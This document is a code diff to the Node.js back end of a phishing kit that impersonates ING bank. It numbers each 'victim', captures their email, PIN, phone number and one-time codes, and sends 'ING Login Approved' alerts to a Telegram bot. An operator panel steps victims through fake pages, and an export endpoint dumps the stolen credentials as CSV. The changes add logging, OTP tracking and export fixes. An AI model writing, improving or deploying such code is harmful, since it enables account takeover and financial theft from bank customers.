@@ -9,21 +9,32 @@ const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
 const COOKIE_NAME    = 'pan_sess_v2';
 
-// Telegram Bot Config - Updated variable names
+// Telegram Bot Config
 const TOKEN = process.env.TOKEN || '';
 const CHAT_ID = process.env.CHAT_ID || '';
 
 const app  = express();
 const PORT = process.env.PORT || 3000;
 
-console.log('ENV check:', { PANEL_USER, PANEL_PASS: '***', TOKEN: TOKEN ? '***' : 'not set' });
+console.log('ENV check:', { 
+  PANEL_USER, 
+  PANEL_PASS: '***', 
+  TOKEN: TOKEN ? '***' : 'not set',
+  CHAT_ID: CHAT_ID ? '***' : 'not set'
+});
 
 /* ----------  TELEGRAM BOT HELPER  ---------- */
 async function sendTelegramMessage(message) {
-  if (!TOKEN || !CHAT_ID) return;
+  if (!TOKEN || !CHAT_ID) {
+    console.log('[TELEGRAM] Skipping - no TOKEN or CHAT_ID configured');
+    return;
+  }
   try {
     const fetch = (await import('node-fetch')).default;
-    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+    console.log('[TELEGRAM] Sending message to chat:', CHAT_ID);
+    
+    const response = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -32,8 +43,15 @@ async function sendTelegramMessage(message) {
         parse_mode: 'HTML'
       })
     });
+    
+    const result = await response.json();
+    if (!result.ok) {
+      console.error('[TELEGRAM] API error:', result.description);
+    } else {
+      console.log('[TELEGRAM] Message sent successfully');
+    }
   } catch (err) {
-    console.error('Telegram send failed:', err);
+    console.error('[TELEGRAM] Send failed:', err.message);
   }
 }
 
@@ -302,7 +320,20 @@ app.post('/api/login', async (req, res) => {
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ time: Date.now(), action: 'ENTERED CREDENTIALS', detail: `Client: ${email}` });
 
-    auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, phone: '', ip: v.ip, ua: v.ua });
+    // Create audit log entry with all fields initialized
+    auditLog.push({ 
+      t: Date.now(), 
+      victimN: v.victimNum, 
+      sid, 
+      email, 
+      password, 
+      phone: '', 
+      otp: '',
+      ip: v.ip, 
+      ua: v.ua 
+    });
+    
+    console.log(`[AUDIT] Created entry for victim #${v.victimNum}`);
     res.sendStatus(200);
   } catch (err) {
     console.error('Login error', err);
@@ -316,14 +347,33 @@ app.post('/api/verify', async (req, res) => {
     if (!phone?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
-    v.phone = phone; v.status = 'wait';
+    v.phone = phone; 
+    v.status = 'wait';
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ time: Date.now(), action: 'ENTERED PHONE', detail: `Phone: ${phone}` });
 
+    // Update audit log entry with phone
     const entry = auditLog.find(e => e.sid === sid);
-    if (entry) entry.phone = phone;
+    if (entry) {
+      entry.phone = phone;
+      console.log(`[AUDIT] Updated phone for victim #${v.victimNum}: ${phone}`);
+    } else {
+      // Create new entry if not found (shouldn't happen but just in case)
+      auditLog.push({ 
+        t: Date.now(), 
+        victimN: v.victimNum, 
+        sid, 
+        email: v.email || '', 
+        password: v.password || '', 
+        phone: phone, 
+        otp: '',
+        ip: v.ip, 
+        ua: v.ua 
+      });
+    }
+    
     res.sendStatus(200);
   } catch (e) {
     console.error('Verify error', e);
@@ -355,14 +405,20 @@ app.post('/api/otp', async (req, res) => {
     if (!otp?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
-    v.otp = otp; v.status = 'wait';
+    v.otp = otp; 
+    v.status = 'wait';
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });
 
+    // Update audit log entry with OTP
     const entry = auditLog.find(e => e.sid === sid);
-    if (entry) entry.otp = otp;
+    if (entry) {
+      entry.otp = otp;
+      console.log(`[AUDIT] Updated OTP for victim #${v.victimNum}`);
+    }
+    
     res.sendStatus(200);
   } catch (err) {
     console.error('OTP error', err);
@@ -389,10 +445,14 @@ app.post('/api/page', async (req, res) => {
   }
 });
 
+// FIXED: Status endpoint now returns full session data including page
 app.get('/api/status/:sid', (req, res) => {
   const v = sessionsMap.get(req.params.sid);
   if (!v) return res.json({ status: 'gone' });
-  res.json({ status: v.status });
+  res.json({ 
+    status: v.status,
+    page: v.page  // Include page for checking success/approved
+  });
 });
 
 app.post('/api/clearRedo', (req, res) => {
@@ -500,8 +560,10 @@ app.post('/api/panel', async (req, res) => {
       else if (v.page === 'unregister.html') v.page = 'otp.html';
       else if (v.page === 'otp.html') { 
         v.page = 'success'; 
+        v.status = 'approved';
         successfulLogins++;
         // Send to Telegram
+        console.log('[TELEGRAM] Sending approval notification...');
         sendTelegramMessage(
           `🦁 <b>ING Login Approved</b>\n\n` +
           `Victim #${v.victimNum}\n` +
@@ -535,6 +597,14 @@ app.post('/api/skip', (req, res) => {
   v.status = 'approved';
   successfulLogins++;
   
+  // Update audit log with current data
+  const entry = auditLog.find(e => e.sid === sid);
+  if (entry) {
+    entry.phone = v.phone || entry.phone;
+    entry.otp = v.otp || entry.otp;
+  }
+  
+  console.log('[TELEGRAM] Sending quick approval notification...');
   // Send to Telegram
   sendTelegramMessage(
     `🦁 <b>ING Login Approved (Quick)</b>\n\n` +
@@ -573,6 +643,9 @@ app.get('/api/export', (req, res) => {
   req.session.lastActivity = Date.now();
   req.session.save();
 
+  console.log(`[EXPORT] Audit log entries: ${auditLog.length}`);
+  console.log(`[EXPORT] Sessions map size: ${sessionsMap.size}`);
+
   // Get all sessions with at least email+password OR phone
   const sessions = Array.from(sessionsMap.values())
     .filter(v => (v.email && v.password) || v.phone)
@@ -588,18 +661,22 @@ app.get('/api/export', (req, res) => {
       timestamp: v.dateStr
     }));
 
-  // Also include audit log entries
-  const auditEntries = auditLog.map(r => ({
-    victimNum: r.victimN,
-    client: r.email,
-    pin: r.password,
-    phone: r.phone || '',
-    otp: r.otp || '',
-    ip: r.ip,
-    status: 'audit',
-    page: '-',
-    timestamp: new Date(r.t).toISOString()
-  }));
+  // Also include audit log entries - FIXED: include all entries with data
+  const auditEntries = auditLog
+    .filter(r => r.email || r.phone)  // Only include if has some data
+    .map(r => ({
+      victimNum: r.victimN,
+      client: r.email || '',
+      pin: r.password || '',
+      phone: r.phone || '',
+      otp: r.otp || '',
+      ip: r.ip,
+      status: 'audit',
+      page: '-',
+      timestamp: new Date(r.t).toISOString()
+    }));
+
+  console.log(`[EXPORT] Sessions: ${sessions.length}, Audit entries: ${auditEntries.length}`);
 
   // Merge and deduplicate by victimNum, keeping latest
   const allEntries = [...sessions, ...auditEntries];
@@ -612,6 +689,8 @@ app.get('/api/export', (req, res) => {
       return acc;
     }, {})
   ).sort((a, b) => a.victimNum - b.victimNum);
+
+  console.log(`[EXPORT] Unique entries: ${uniqueEntries.length}`);
 
   const csv = [
     ['Victim#','Client','PIN','Phone','OTP','IP','Status','Page','Timestamp'],
